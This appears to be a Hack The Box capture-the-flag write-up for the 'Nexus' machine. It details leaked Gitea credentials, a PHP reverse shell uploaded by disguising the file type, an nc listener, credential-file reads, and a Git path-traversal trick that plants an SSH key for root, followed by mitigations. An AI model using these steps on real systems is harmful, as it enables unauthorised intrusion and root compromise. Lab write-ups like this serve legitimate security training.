# Hack The Box — Nexus Write-up

## Summary

The target at `nexus.htb` hosted the main Nexus Energy Authority website. Virtual host enumeration identified the subdomains `git.nexus.htb` and `billing.nexus.htb`. A public Gitea repository exposed Krayin CRM application configuration, including database credentials and an `APP_KEY`. The discovered credentials were used to log in to the billing application.

Initial access was obtained by uploading a PHP reverse shell through the TinyMCE upload feature in Krayin CRM. The shell ran as `www-data`. Application environment files were then found, allowing a pivot to the user `jones`.

Privilege escalation abused the `gitea-template-sync` service, which synchronized template repositories. A Git tree containing the traversal path `../../../../root/.ssh/authorized_keys` caused the service to write the attacker's public key to `/root/.ssh/authorized_keys`. SSH access as root was then obtained, followed by `root.txt`.

## Target Information

- Machine: Nexus
- Main domain: `nexus.htb`
- Relevant subdomains:
  - `git.nexus.htb`
  - `billing.nexus.htb`
- OS: Ubuntu 24.04.4 LTS
- Web stack:
  - Nginx
  - Gitea 1.26.0
  - Krayin CRM

## Enumeration

The main website was available at:

```text
http://nexus.htb
```

The careers page contained an internal email address:

```text
j.matthew@nexus.htb
```

Virtual host enumeration was performed with ffuf:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -u http://nexus.htb/ \
  -H "Host: FUZZ.nexus.htb" \
  -fw 4
```

Relevant results:

```text
git       [Status: 200]
billing   [Status: 302]
```

The hosts were then added to `/etc/hosts` on Kali:

```text
10.129.84.131 nexus.htb git.nexus.htb billing.nexus.htb
```

## Gitea Enumeration

A public repository was found on `git.nexus.htb`:

```text
admin/krayin-docker-setup
```

The repository contained an `.env` file. A commit diff exposed important configuration values:

```text
APP_URL=http://billing.nexus.htb
APP_DEBUG=true

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

These credentials were then used to access the billing application.

## Initial Access

The billing application was available at:

```text
http://billing.nexus.htb
```

After logging in to the Krayin CRM dashboard, the TinyMCE upload feature was used to upload a PHP file.

The upload request was modified in Burp Suite:

```http
Content-Disposition: form-data; name="file"; filename="php.reverse.shell.php"
Content-Type: image/png
```

The file contained a PHP reverse shell. The server returned the upload path:

```text
/storage/tinymce/<random>.php
```

A listener was prepared on Kali:

```bash
nc -lvnp 443
```

Opening the PHP file in the browser triggered a shell connection:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell was then stabilized:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Post-Exploitation

From the `www-data` shell, the application configuration file was found in the Krayin directory:

```bash
cat .env
```

Relevant contents:

```text
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

Local users were enumerated:

```bash
cat /etc/passwd
```

Relevant users:

```text
jones:x:1000:1000:/home/jones:/bin/bash
git:x:111:112:Git Version Control:/home/git:/bin/bash
```

Access as `jones` was then obtained using the discovered credentials.

The user flag was located at:

```text
/home/jones/user.txt
```

## Privilege Escalation

Systemd timer enumeration identified a relevant service:

```bash
systemctl list-timers
```

The timer and service were:

```text
gitea-template-sync.timer -> gitea-template-sync.service
```

The service synchronized template repositories from Gitea. The target repository was configured as a template repository:

```text
jones/rce
```

Because the target machine had no DNS mapping for `git.nexus.htb`, Git was configured to use a host header or a local address override when cloning or pushing:

```bash
git -c http.extraHeader="Host:git.nexus.htb" \
  clone http://jones:'y27xb3ha!!74GbR'@127.0.0.1/jones/rce.git
```

A public/private key pair was generated:

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

A Git object was then constructed with the following traversal path:

```text
../../../../root/.ssh/authorized_keys
```

The objective was to make the synchronization service write the attacker's public key to root's authorized keys file.

The `build.py` script was run from inside the Git repository:

```bash
cd /tmp/rce
python3 /tmp/build.py
```

The script successfully created a commit object:

```text
Done: f0f50f4880b6bab00bee0cbda19d16933c258bc4
```

The repository was then pushed:

```bash
git remote set-url origin 'http://jones:y27xb3ha%21%2174GbR@git.nexus.htb/jones/rce.git'

git -c http.curloptResolve=git.nexus.htb:80:127.0.0.1 \
  push -u origin main --force
```

The push succeeded:

```text
[new branch] main -> main
branch 'main' set up to track 'origin/main'
```

After the timer ran, the public key was written to `/root/.ssh/authorized_keys`.

## Root Access

SSH access as root was obtained using the previously generated private key:

```bash
ssh -i /tmp/.k root@10.129.84.131
```

The login succeeded:

```text
Welcome to Ubuntu 24.04.4 LTS
root@nexus:~#
```

The root flag was read with:

```bash
cat /root/root.txt
```

## Exploitation Chain

```text
Virtual host enumeration
-> discover git.nexus.htb
-> admin/krayin-docker-setup repository exposes .env
-> use credentials to log in to billing.nexus.htb
-> upload a PHP reverse shell through TinyMCE
-> obtain a shell as www-data
-> enumerate local users and application configuration
-> obtain access as jones
-> abuse gitea-template-sync path traversal
-> write an SSH public key to /root/.ssh/authorized_keys
-> log in as root over SSH
-> root.txt
```

## Impact

- Sensitive credentials were stored in a public repository.
- File uploads in the billing application allowed PHP execution.
- The template synchronization service did not validate traversal paths in Git trees.
- These vulnerabilities together allowed a remote attacker to obtain root access.

## Mitigation Recommendations

1. Do not store `.env` files, database credentials, or application secrets in repositories.
2. Rotate all credentials that have been exposed.
3. Restrict uploads to safe file types and store them in a location where code cannot execute.
4. Disable PHP execution in upload directories.
5. Validate and normalize paths during template synchronization.
6. Run the synchronization service as a non-root user with minimal permissions.
7. Protect against Git tree traversal, including `..` components and absolute paths.
